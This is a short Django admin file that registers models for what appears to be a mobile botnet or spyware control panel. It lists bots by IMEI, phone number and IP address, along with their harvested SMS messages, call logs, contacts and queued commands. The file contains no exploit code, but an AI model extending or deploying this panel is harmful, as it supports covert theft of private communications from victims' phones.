# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.contrib import admin
from .models import Bot, BotCommand, SmsData, CallLog, Contact


class BotAdmin(admin.ModelAdmin):
    list_display = ('id', 'last_online', 'hash', 'imei', 'number', 'model', 'os', 'ipaddr')


class SmsDataAdmin(admin.ModelAdmin):
    list_display = ('bot', 'date', 'address', 'message', 'type')


class BotCommandAdmin(admin.ModelAdmin):
    list_display = ('bot', 'command', 'parameters', 'deployed', 'executed')


class CallLogAdmin(admin.ModelAdmin):
    list_display = ('bot', 'date', 'type_str', 'type', 'number', 'duration')


class ContactAdmin(admin.ModelAdmin):
    list_display = ('bot', 'display_name', 'data')


admin.site.register(Bot, BotAdmin)
admin.site.register(SmsData, SmsDataAdmin)
admin.site.register(BotCommand, BotCommandAdmin)
admin.site.register(CallLog, CallLogAdmin)
admin.site.register(Contact, ContactAdmin)